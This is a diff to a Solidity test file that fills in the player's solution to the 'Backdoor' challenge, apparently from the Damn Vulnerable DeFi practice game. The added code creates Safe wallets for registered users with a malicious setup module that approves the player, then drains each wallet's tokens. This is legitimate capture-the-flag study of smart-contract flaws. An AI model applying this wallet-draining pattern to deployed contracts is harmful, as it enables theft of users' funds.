@@ -7,8 +7,12 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {FakeModule} from "./FakeModule.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import {stdStorage, StdStorage} from "forge-std/Test.sol";
 
 contract BackdoorChallenge is Test {
+    using stdStorage for StdStorage;
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
@@ -20,6 +24,7 @@ contract BackdoorChallenge is Test {
     Safe singletonCopy;
     SafeProxyFactory walletFactory;
     WalletRegistry walletRegistry;
+    FakeModule fakeModule;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -70,7 +75,45 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        fakeModule = new FakeModule();
+
+        // Create 4 proxyWallet, one for each user
+        address[] memory safeProxies = new address[](users.length);
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            bytes memory setUpData = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(fakeModule),
+                abi.encodeWithSelector(
+                    FakeModule.approveFake.selector,
+                    address(token),
+                    10e18,
+                    player
+                ),
+                address(0),
+                address(0),
+                0,
+                0
+            );
+
+            safeProxies[i] = address(walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                setUpData,
+                i,
+                IProxyCreationCallback(address(walletRegistry))
+            ));
+        }
+
+        // Drain funds from proxies
+        for (uint256 i = 0; i < safeProxies.length; i++) {
+            console.log(token.balanceOf(safeProxies[i]));
+            console.log(token.allowance(safeProxies[i], recovery));
+            token.transferFrom(safeProxies[i], recovery, 10e18);
+        }
     }
 
     /**
